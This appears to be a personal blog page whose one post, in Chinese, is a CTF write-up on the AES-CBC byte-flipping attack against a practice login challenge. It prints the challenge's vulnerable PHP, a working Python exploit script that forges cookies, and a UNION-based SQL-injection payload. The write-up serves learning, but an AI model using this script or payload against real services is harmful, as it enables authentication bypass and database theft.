@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.1.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.1.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.1.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.1.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Pur3uit">
+<meta property="og:url" content="http://cqlin1995.github.io/index.html">
+<meta property="og:site_name" content="Pur3uit">
+<meta property="og:locale" content="zh-CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pur3uit">
+
+
+
+
+
+
+  <link rel="canonical" href="http://cqlin1995.github.io/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Pur3uit</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"> 
+
+<div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pur3uit</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">The quieter you become, the more you are able to hear!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+          
+  
+  <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />首页</a>
+</li>
+
+      
+        
+        
+          
+  
+  <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />标签</a>
+</li>
+
+      
+        
+        
+          
+  
+  <li class="menu-item menu-item-categories menu-item-active">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />分类</a>
+</li>
+
+      
+        
+        
+          
+  
+  <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />归档</a>
+</li>
+
+      
+
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+  
+
+
+
+ </div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://cqlin1995.github.io/2018/04/07/CBC-byte-flipping-attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cqlin1995">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pur3uit">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/04/07/CBC-byte-flipping-attack/" itemprop="url">CBC-byte-flipping-attack</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-07T16:50:14+08:00">2018-04-07</time>
+            
+
+            
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>在做ctf题目的过程中，遇到了cbc字节翻转攻击的利用技巧，在深入学习之后，觉得应该记录下来，以免遗忘。</p>
+<h3 id="AES-CBC模式的加密与解密原理"><a href="#AES-CBC模式的加密与解密原理" class="headerlink" title="AES CBC模式的加密与解密原理"></a>AES CBC模式的加密与解密原理</h3><p>分组密码链接模式的特点在于：加密时，每一个明文分组(除了第一个明文分组)加密之前都需要和前一个密文分组进行异或处理之后，才可以进行加密处理；<br>解密时，每一个密文分组经过解密处理之后，都需要和前一个密文分组进行异或处理，才可以得到对应的明文分组。</p>
+<p>分组密码链接模式，顾名思义，加密和解密过程都是以分组进行的。每一个分组大小为128bits(16字节)，如果明文的长度不是16字节的整数倍，需要对最后<br>一个分组进行填充(padding)，使得最后一个分组长度为16字节。</p>
+<p>对于加密时的第一个明文分组，需要通过和IV(初始化向量)进行异或处理之后，才可以进行加密处理；解密时的第一个密文分组，解密之后，需要通过和IV进<br>行异或处理，才可以得到第一个明文分组。</p>
+<p>这里的IV为不可预测的，随机生成的16字节向量，它不需要保密，但是需要保证完整性。</p>
+<p>　　<strong>CBC模式的加解密过程</strong><br><img src="/images/posts/web-security/aes-encrypt-decrypt.PNG" alt="">{:height=”500px” width=”500px”}</p>
+<blockquote>
+<ul>
+<li>加密过程</li>
+<li>1.将明文的第一个分组与IV进行异或，送入加密模块进行加密，得到第一个密文分组。</li>
+<li>2.从第二个明文分组开始，将明文分组与前一个密文分组进行异或。</li>
+<li>3.将第2步得到的结果送入加密模块进行加密。</li>
+<li>4.将每一个密文分组拼接起来形成密文。</li>
+</ul>
+</blockquote>
+<p>假设明文分组的下标从1开始</p>
+<p>$C_0 = IV$</p>
+<p>$C_i = E_k(P_i \oplus C_{i-1})$</p>
+<p><br></p>
+<blockquote>
+<ul>
+<li>解密过程</li>
+<li>1.将密文的第一个分组进行解密，得到的结果与IV进行异或处理，得到第一个明文分组。</li>
+<li>2.从第二个密文分组开始，先对每一个密文分组进行解密处理，到第3步。</li>
+<li>3.将第2步得到的结果与前一个密文分组进行异或处理，得到对应的明文分组。</li>
+<li>4.将每一个明文分组拼接在一块，便得到原先的明文。</li>
+</ul>
+</blockquote>
+<p>$P_i = D_k(C_i) \oplus C_{i-1}$</p>
+<p>$C_0 = IV$</p>
+<p>　　从上面解密过程中，我们可以发现，解密明文分组的过程受前一个密文分组的影响，所以我们可以通过控制前一个密文分组的<br>内容，进而控制解密明文的内容。</p>
+<h3 id="CBC翻转攻击的原理"><a href="#CBC翻转攻击的原理" class="headerlink" title="CBC翻转攻击的原理"></a>CBC翻转攻击的原理</h3><p>从上面的分析我们可以看出来，CBC字节翻转攻击发生在解密的时候。</p>
+<p>假设我们只考虑单字节的操作。</p>
+<blockquote>
+<p>$P_i[0] = D_k(C_i)[0] \oplus C_{i-1}[0]$</p>
+</blockquote>
+<blockquote>
+<p>0 = $P_i[0] \oplus D_k(C_i)[0] \oplus C_{i-1}[0]$</p>
+</blockquote>
+<blockquote>
+<p>$P_{new} = P_i[0] \oplus D_k(C_i)[0] \oplus C_{i-1}[0] \oplus P_{new}$</p>
+</blockquote>
+<p>这里$P_{new}$为我们想要的明文。</p>
+<p>通过上面的操作，我们可以看到，如果我们让前一个密文分组对应的字节的值，修改为$C_{i-1}[0] \oplus P_i[0] \oplus P_{new}$，<br>就可以达到修改明文的目的。通过这种方法，便可以绕过服务器的检测。</p>
+<h3 id="利用实例"><a href="#利用实例" class="headerlink" title="利用实例"></a>利用实例</h3><p>接下来，举一个例子，来说明具体如何利用这种技巧。</p>
+<p>首先将泄露的代码拷贝下来，进行审计。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="string">'***********'</span>);</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'conn.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqliCheck</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/\\\|,|-|#|=|~|union|like|procedure/i"</span>,$str))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode($iv));</span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $link;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="string">'cipher'</span>]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[<span class="string">"iv"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode($plain).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            $sql=<span class="string">"select * from users limit "</span>.$info[<span class="string">'id'</span>].<span class="string">",0"</span>;</span><br><span class="line">            $result=mysqli_query($link,$sql);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>  <span class="keyword">or</span> <span class="keyword">die</span>(mysqli_error($link)))&#123;</span><br><span class="line">            	$rows=mysqli_fetch_array($result);</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;h1&gt;&lt;center&gt;Hello!'</span>.$rows[<span class="string">'username'</span>].<span class="string">'&lt;/center&gt;&lt;/h1&gt;'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    $id = (string)$_POST[<span class="string">'id'</span>];</span><br><span class="line">    <span class="keyword">if</span>(sqliCheck($id))</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"&lt;h1 style='color:red'&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;"</span>);</span><br><span class="line">    $info = <span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id);</span><br><span class="line">    login($info);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">"iv"</span>])&amp;&amp;<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]))&#123;</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;body class="login-body" style="margin:0 auto"&gt;</span></span><br><span class="line"><span class="string">                &lt;div id="wrapper" style="margin:0 auto;width:800px;"&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="header"&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;input id to login&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="content"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="id" type="text" class="input id" value="id" onfocus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="footer"&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;&lt;input type="submit" name="submit" value="Login" class="button" /&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>通过对代码的分析，可以看出它的处理逻辑。</p>
+<blockquote>
+<p>1.首先判断post提交的数据当中是否包含id值；如果包含，转到第2步；如果没有包含，转到第3步。</p>
+</blockquote>
+<blockquote>
+<p>2.将id的值读取出来，并进行sql注入检测，在sqliCheck函数当中，对常见的特殊字符都进行了过滤。然后对id的值进行了aes-cbc加密处理，并将IV和加<br>密后的内容cipher，作为cookie一并返回。</p>
+</blockquote>
+<blockquote>
+<p>3.如果post提交的内容当中，不包含id，则将post当中的IV和cipher提取出来，在show_homepage函数当中进行操作。</p>
+</blockquote>
+<p>仔细分析关键代码，发现有两个地方存在问题：</p>
+<blockquote>
+<p>1.show_homepage函数对IV和cipher传过来的值并没有进行校验，是一个绕过的点。</p>
+</blockquote>
+<blockquote>
+<p>2.sqliCheck函数的过滤，并不完善，可以通过%00截断后面的数据。来构造sql注入语句，select * from users limit 1。因为原先的sql语句limit的rows参数为0，<br>所以无论id值为多少，都不会将username的值echo出来。</p>
+</blockquote>
+<p>需要两步操作，来完成输出username的值。</p>
+<blockquote>
+<p>1.post提交id的值为1%00。</p>
+</blockquote>
+<blockquote>
+<p>2.将返回的IV和cipher放在cookie域当中，并去掉id值。提交。</p>
+</blockquote>
+<p><img src="/images/posts/web-security/cbc-1.PNG" alt="">{:height = “150px” width = “150px”}<br><br><br><img src="/images/posts/web-security/cbc-2.png" alt="">{:height = “150px” width = “150px”}</p>
+<p>然而username里面放的值不是我们想要的。现在我们需要用到cbc字节翻转，来构造sql注入语句。<br>由于sqliCheck函数将<code>‘=’，‘，’，‘union&#39;</code>全部过滤了，所以需要用1nion代替union，用join代替逗号，用regexp代替等号，然后使用cbc字节翻转将1换为u，得到union。</p>
+<p>为了方便，写一个脚本，进行测试。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse <span class="keyword">as</span> pa</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment">#两个字节序列进行异或操作</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_xor</span><span class="params">(b1,b2)</span>:</span></span><br><span class="line">	temp = []</span><br><span class="line">	<span class="keyword">for</span> x,y <span class="keyword">in</span> zip(b1,b2):</span><br><span class="line">		temp.append(bytes([x^y]))</span><br><span class="line">	<span class="keyword">return</span> <span class="string">b''</span>.join(temp)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一次payload一个正常的数据，得到iv和cipher</span></span><br><span class="line">payload = &#123;<span class="string">'id'</span>:<span class="string">'12'</span>,<span class="string">'submit'</span>:<span class="string">'Login'</span>&#125;</span><br><span class="line">r = requests.post(<span class="string">'http://ctf5.shiyanbar.com/web/jiandan/index.php'</span>,data=payload)</span><br><span class="line">iv_old = r.cookies[<span class="string">'iv'</span>]</span><br><span class="line">cipher_old = base64.b64decode(pa.unquote(r.cookies[<span class="string">'cipher'</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#对cipher进行cbc字节翻转，得到新的cipher</span></span><br><span class="line">cipher_new = cipher_old[:<span class="number">4</span>] + bytes([cipher_old[<span class="number">4</span>] ^ ord(<span class="string">'2'</span>) ^ ord(<span class="string">'#'</span>)]) + cipher_old[<span class="number">5</span>:]</span><br><span class="line">cipher_new = pa.quote(base64.b64encode(cipher_new))</span><br><span class="line"></span><br><span class="line"><span class="comment">#将新的cipher和原先的iv作为cookie发送给服务器，得到一段乱码的明文。</span></span><br><span class="line">cookies = dict(iv=iv_old,cipher=cipher_new)</span><br><span class="line">r_new = requests.get(<span class="string">'http://ctf5.shiyanbar.com/web/jiandan/index.php'</span>,cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="comment">#将得到的明文进行base64解码，取出其中的前16字节，与原先的iv和第一个明文分组进行异或操作</span></span><br><span class="line">iv_old = base64.b64decode(pa.unquote(iv_old))</span><br><span class="line">plain_first_block = <span class="string">b'a:1:&#123;s:2:"id";s:'</span></span><br><span class="line">content = r_new.content.decode()</span><br><span class="line">index1 = content.find(<span class="string">"base64_decode"</span>) + <span class="number">14</span></span><br><span class="line">index2 = content.find(<span class="string">'can'</span>) - <span class="number">2</span></span><br><span class="line">plain = content[index1:index2]</span><br><span class="line">plain = base64.b64decode(plain)[:<span class="number">16</span>]</span><br><span class="line">temp = bytes_xor(iv_old,plain)</span><br><span class="line">iv_new = pa.quote(base64.b64encode(bytes_xor(temp,plain_first_block)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#将得到的新的iv和新的cipher，作为cookie发送给服务器，便可以绕过sql注入监测。</span></span><br><span class="line">cookies = dict(iv=iv_new,cipher=cipher_new)</span><br><span class="line">r_new_2 = requests.get(<span class="string">'http://ctf5.shiyanbar.com/web/jiandan/index.php'</span>,cookies=cookies)</span><br><span class="line"></span><br><span class="line">print(r_new_2.content.decode())</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>这里需要注意的是，当我们修改密文的第一个分组，来使得第二个明文分组更改为我们想要的结果，会破坏原先的第一个明文分组的内容，导致show_homepage()函数<br>进行反序列化处理的时候发生异常，所以我们需要对IV进行处理，使得第一个明文分组恢复为原先的值。</p>
+</blockquote>
+<p>通过sql注入测试，知道了数据库中有两个表：user和you_want。显然，you_want表当中包含我们需要的东西，进一步注入得到you_want表中只有一个字段value。</p>
+<p>所以我们构造如下的payload：</p>
+<blockquote>
+<p>‘id’:’0 2nion select <em> from((select 1)a join (select </em> from you_want)b join (select 3)c);’+chr(0)</p>
+</blockquote>
+<p>结果如下：<br><img src="/images/posts/web-security/cbc-3.png" alt="">{:height=”50px” weight=”100px”}</p>
+<p><br></p>
+<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="http://zjw.dropsec.xyz/CTF/2017/04/24/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB.html" target="_blank" rel="noopener">CBC字节翻转攻击</a></p>
+<p><a href="https://www.jianshu.com/p/4c1e5d24d781" target="_blank" rel="noopener">CTF_WP-实验吧-简单的登录题</a></p>
+<h4 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址:"></a>题目地址:</h4><p><a href="http://www.shiyanbar.com/ctf/2037" target="_blank" rel="noopener">简单的登录题</a></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+  </section>
+
+  
+
+
+          </div>
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">cqlin1995</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cqlin1995</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.7.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/theme-next/hexo-theme-next">NexT.Pisces</a> v6.1.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.1.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.1.0"></script>
+
+
+
+  
+
+  
+
+
